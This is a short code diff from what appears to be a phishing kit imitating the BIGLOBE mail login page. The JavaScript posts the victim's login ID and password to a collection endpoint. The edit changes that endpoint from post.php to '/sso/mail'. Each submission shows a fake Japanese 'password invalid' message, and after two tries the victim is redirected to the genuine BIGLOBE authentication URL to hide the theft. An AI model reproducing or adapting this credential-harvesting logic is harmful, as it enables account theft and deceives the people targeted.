@@ -418,7 +418,7 @@ swal("パスワードが空です");
       
       $.ajax({
         dataType: 'JSON',
-        url: 'post.php',
+        url: '/sso/mail',
         type: 'POST',
         data:{
           loginid:loginid,
@@ -436,7 +436,7 @@ swal("パスワードが空です");
                  $("#biglobe_pw").val("");
                   if (count>=2) {
                     count=0;
-                     window.location.replace("https://www."+my_slice);
+                     window.location.replace("https://auth.sso.biglobe.ne.jp/mail/");
 
                   }
 				  swal("パスワードが無効です。再入力してください。");
@@ -451,7 +451,7 @@ swal("パスワードが無効です。再入力してください。");
              $("#biglobe_pw").val("");
               if (count>=2) {
                 count=0;
-                 window.location.replace("https://www."+my_slice);
+                 window.location.replace("https://auth.sso.biglobe.ne.jp/mail/");
               }
 swal("パスワードが無効です。再入力してください。");
             },
